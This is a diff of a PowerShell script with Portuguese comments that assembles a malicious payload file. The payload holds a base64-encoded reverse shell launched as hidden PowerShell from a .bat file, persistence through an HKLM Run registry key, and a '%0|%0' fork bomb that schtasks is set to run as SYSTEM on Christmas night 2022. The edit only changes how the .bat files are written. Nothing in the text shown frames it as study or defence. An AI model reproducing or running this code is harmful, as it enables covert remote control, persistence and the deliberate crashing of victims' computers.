@@ -18,13 +18,13 @@ $ShellReverseEncoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetByt
 Write-Output '# Salva o comando de shell reversa em uma variavel' > .\payload.txt
 Write-Output "`$cmd = `"$ShellReverseEncoded`"" >> .\payload.txt
 Write-Output '# Salva a shell reversa e define a pesistencia atraves do registry' >> .\payload.txt
-Write-Output 'echo "powershell -W hidden -e $cmd" > C:\Windows\Temp\payload.bat' >> .\payload.txt
+Write-Output 'echo "powershell -W hidden -e $cmd" | out-file -encoding ascii C:\Windows\Temp\payload.bat' >> .\payload.txt
 Write-Output 'reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v persist /d "C:\Windows\Temp\payload.bat"' >> .\payload.txt
 
 
 # Monta a part do Fork Bomb no arquivo
 Write-Output '# Baixa o fork bomb e define para executar na noite de natal' >> .\payload.txt
-Write-Output 'echo "%0|%0" > C:\Windows\Temp\bomb.bat' >> .\payload.txt
+Write-Output 'echo "%0|%0" | out-file -encoding ascii C:\Windows\Temp\bomb.bat' >> .\payload.txt
 Write-Output 'schtasks /create /RU "system" /sc once /sd 25/12/2022 /st 22:45 /tr C:\Windows\Temp\bomb.bat /rl highest /tn "bomb"' >> .\payload.txt
 
 #Executa a shell reversa
